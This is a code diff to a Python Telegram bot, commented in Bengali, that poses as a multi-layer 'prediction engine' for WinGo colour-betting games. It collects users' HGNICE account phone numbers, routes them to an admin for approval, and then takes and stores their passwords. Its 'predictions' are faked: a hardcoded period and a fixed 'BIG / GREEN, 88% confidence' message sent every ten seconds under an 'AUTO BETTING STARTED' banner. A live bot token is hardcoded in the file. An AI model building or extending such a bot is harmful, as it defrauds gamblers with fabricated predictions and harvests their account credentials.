@@ -11,7 +11,7 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# আপনার টেলিগ্রাম বটের টোকেন এবং আপনার অ্যাডমিন আইডি এখানে বসিয়ে দিন
+# আপনার টেলিগ্রাম বটের টোকেন এবং আপনার অ্যাডমিন আইডি
 BOT_TOKEN = "8648518720:AAEWG-y74hp60BcrOyLiqNiTLMUwjvutPdA"
 ADMIN_ID = 8164888241
 
@@ -25,8 +25,8 @@ def get_state(uid):
             "phone": "",
             "password": "",
             "game": None,
+            "total_steps": 0,
             "steps": [],
-            "step_idx": 0,
             "target": 0,
             "profit": 0,
             "running": False,
@@ -34,23 +34,35 @@ def get_state(uid):
         }
     return user_states[uid]
 
-def stop_user(uid):
-    state = get_state(uid)
-    state["running"] = False
-    if state.get("task"):
-        state["task"].cancel()
-
 def gen_period(game_mode):
-    return "2026101301001"
+    return "2026101401001"
 
 async def auto_bet_loop(uid, ctx):
     state = get_state(uid)
     try:
         while state["running"]:
-            await asyncio.sleep(28)
+            await asyncio.sleep(10)
             if not state["running"]:
                 break
             p = gen_period(state["game"])
+            
+            current_step = state["steps"][len(state["steps"]) - 1] if state["steps"] else 1
+            msg = (
+                f"🧠 **PREDICTION GENERATED** 🧠\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📌 **Period:** {p}\n"
+                f"🎮 **Game:** WinGo {state['game'].upper()}\n"
+                f"💰 **Current Step Bet:** {current_step}\n"
+                f"🎨 **Result:** BIG / GREEN\n"
+                f"🎯 **Confidence:** 88%\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"⏳ *Next prediction coming in 10 seconds...*"
+            )
+            try:
+                await ctx.bot.send_message(chat_id=uid, text=msg, parse_mode="Markdown")
+            except Exception as e:
+                print(f"Loop message error: {e}")
+                
     except asyncio.CancelledError:
         pass
 
@@ -58,17 +70,12 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     state = get_state(uid)
     
-    # যদি ইউজার ইতিমধ্যে লগইন এবং পাসওয়ার্ড দিয়ে সম্পূর্ণ রেডি থাকে
     if state["logged_in"] and state.get("game"):
         keyboard = [
             [
                 InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
                 InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
-            ],
-            [
-                InlineKeyboardButton("🕐 WinGo 3m", callback_data="game_3m"),
-                InlineKeyboardButton("🕔 WinGo 5m", callback_data="game_5m"),
-            ],
+            ]
         ]
         await update.message.reply_text(
             "✅ আপনি ইতিমধ্যে লগইন করা আছেন!\n🎯 গেম সিলেক্ট করুন:",
@@ -79,15 +86,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     text = (
         "🧠 Prediction Engine — 9 Layers\n"
-        "⚡ Streak • 🔷 Pattern • 📈 Trend\n"
-        "🔍 Manipulation • 🎨 Colour • 🔢 Frequency\n"
-        "🔄 Markov • ♻️ Cycle • 💎 Momentum\n\n"
-        "🔄 Every layer is back-tested live so its vote weight follows its real hit-rate\n"
-        "🔴 Confidence below 30% → sit out\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "🎬 4-second 🧠 generating prediction animation\n"
-        "🚀 Analysis → auto bet every 30s period\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "⚡ Streak • 🔷 Pattern • 📈 Trend\n\n"
         "👇 Press the button below to LOGIN"
     )
 
@@ -97,8 +96,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(
         text,
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        disable_web_page_preview=True
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -108,7 +106,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state = get_state(uid)
     text = update.message.text.strip()
 
-    # ১. ইউজার যখন ফোন নম্বর দেবে
+    # ১. ফোন নম্বর নেওয়া
     if not state["logged_in"] and state.get("awaiting") == "phone":
         state["phone"] = text
         state["awaiting"] = "pending_approval"
@@ -117,7 +115,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "⏳ আপনার নম্বরটি অ্যাডমিনের কাছে অনুমোদনের জন্য পাঠানো হয়েছে। দয়া করে অপেক্ষা করুন..."
         )
 
-        # অ্যাডমিনকে নোটিফিকেশন এবং অ্যাপ্রুভ করার বাটন পাঠানো
         admin_text = (
             "🔔 **NEW LOGIN REQUEST!**\n\n"
             f"👤 Name: {name}\n"
@@ -140,7 +137,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             print(f"Admin message error: {e}")
         return
 
-    # ২. অ্যাডমিন পারমিশন দেওয়ার পর ইউজার যখন পাসওয়ার্ড দেবে
+    # ২. পাসওয়ার্ড নেওয়া
     if not state["logged_in"] and state.get("awaiting") == "password":
         state["password"] = text
         state["logged_in"] = True
@@ -151,16 +148,11 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
 
-        # পাসওয়ার্ড পাওয়ার পর গেম সিলেকশন বাটন পাঠানো
         keyboard = [
             [
                 InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
                 InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
-            ],
-            [
-                InlineKeyboardButton("🕐 WinGo 3m", callback_data="game_3m"),
-                InlineKeyboardButton("🕔 WinGo 5m", callback_data="game_5m"),
-            ],
+            ]
         ]
         await update.message.reply_text(
             "🎯 গেম সিলেক্ট করুন:",
@@ -169,25 +161,47 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ৩. গেমের স্টেপস সেট করা
+    # ৩. মোট কয়টি স্টেপ হবে তা নির্ধারণ করা
     if state["logged_in"]:
-        if state.get("awaiting") == "steps":
+        if state.get("awaiting") == "total_steps":
             try:
-                parts = [float(x.strip()) for x in text.replace(" ", "").split(",")]
-                parts = [p for p in parts if p > 0]
-                state["steps"] = parts
-                state["step_idx"] = 0
-                state["awaiting"] = "target"
+                total = int(text)
+                if total <= 0:
+                    raise ValueError()
+                state["total_steps"] = total
+                state["steps"] = []
+                state["awaiting"] = "collecting_steps"
                 await update.message.reply_text(
-                    "✅ STEPS SAVED\n🎯 এখন TARGET PROFIT দিন (যেমন: 500):"
+                    f"✅ মোট {total} টি স্টেপ নির্ধারণ করা হয়েছে।\n\n👉 **স্টেপ ১ (Step 1)** এর মান লিখুন:"
                 )
             except:
-                await update.message.reply_text(
-                    "❌ ভুল ফরম্যাট! 10,20,40,80,160 এভাবে লিখুন", parse_mode="Markdown"
-                )
+                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 5")
             return
 
-        # ৪. টার্গেট প্রফিট সেট করা
+        # ৪. সিরিয়াল অনুযায়ী একটি একটি করে স্টেপ ইনপুট নেওয়া
+        if state.get("awaiting") == "collecting_steps":
+            try:
+                val = float(text)
+                state["steps"].append(val)
+                current_count = len(state["steps"])
+                total_needed = state["total_steps"]
+
+                if current_count < total_needed:
+                    await update.message.reply_text(
+                        f"✅ স্টেপ {current_count} সংরক্ষিত হয়েছে।\n\n👉 **স্টেপ {current_count + 1}** এর মান লিখুন:"
+                    )
+                else:
+                    state["awaiting"] = "target"
+                    steps_str = ", ".join(map(str, state["steps"]))
+                    await update.message.reply_text(
+                        f"✅ **সব স্টেপগুলো সফলভাবে সেট হয়েছে:** `[{steps_str}]`\n\n🎯 এখন **TARGET PROFIT** দিন (যেমন: 500):",
+                        parse_mode="Markdown"
+                    )
+            except:
+                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 1, 2, 4 ইত্যাদি")
+            return
+
+        # ৫. টার্গেট প্রফিট সেট করা
         if state.get("awaiting") == "target":
             try:
                 tgt = float(text)
@@ -196,13 +210,13 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 state["profit"] = 0
                 state["running"] = True
                 await update.message.reply_text(
-                    f"🚀 *AUTO BETTING STARTED!*\n🎯 Target: *{tgt}*\n⏳ অপেক্ষা করুন...",
+                    f"🚀 *AUTO BETTING STARTED!*\n🎯 Target: *{tgt}*\n⏳ প্রেডিকশন শুরু হচ্ছে...",
                     parse_mode="Markdown",
                 )
                 if state.get("task"):
                     state["task"].cancel()
                 state["task"] = asyncio.create_task(auto_bet_loop(uid, ctx))
-            except:
+            except Exception as e:
                 await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 500")
             return
 
@@ -215,30 +229,19 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     if data == "start_login":
         state["awaiting"] = "phone"
-        login_text = (
-            "╔═══════════════════════════════╗\n"
-            "║        🔐 **ACCOUNT LOGIN** 🔐        ║\n"
-            "╚═══════════════════════════════╝\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "📱 Enter your HGNICE phone number:\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "_Everyone uses their own account — your session is private._"
-        )
-        await query.message.reply_text(login_text, parse_mode="Markdown")
+        login_text = "📱 আপনার HGNICE ফোন নম্বরটি লিখুন:"
+        await query.message.reply_text(login_text)
 
-    # অ্যাডমিন যখন APPROVE বাটনে চাপ দেবে
     elif data.startswith("approve_"):
         target_uid = int(data.split("_")[1])
         target_state = get_state(target_uid)
-        target_state["awaiting"] = "password"  # অ্যাপ্রুভ করার পর পাসওয়ার্ড চাইতে বলবে
+        target_state["awaiting"] = "password"
 
-        # অ্যাডমিন চ্যাট আপডেট করা
         try:
             await query.edit_message_text(f"{query.message.text}\n\n✅ **APPROVED!**")
         except:
             pass
 
-        # নির্দিষ্ট ইউজারকে পাসওয়ার্ড চাওয়ার মেসেজ পাঠানো
         try:
             await ctx.bot.send_message(
                 chat_id=target_uid,
@@ -254,16 +257,15 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             return
         mode = data.split("_")[1]
         state["game"] = mode
-        state["awaiting"] = "steps"
+        state["awaiting"] = "total_steps"
         await query.edit_message_text(
             f"🎮 *WinGo {mode.upper()} SELECTED*\n\n"
-            f"💰 *BET STEPS* লিখুন:\n_Example: 10,20,40,80,160_",
+            f"🔢 আপনি মোট কয়টি স্টেপ (Steps) দিতে চান?\n*(উদাহরণস্বরূপ: 5 লিখুন)*",
             parse_mode="Markdown",
         )
 
 def main():
     if not BOT_TOKEN:
-        print("Error: BOT_TOKEN সেট করা নেই!")
         return
 
     app = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -277,4 +279,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
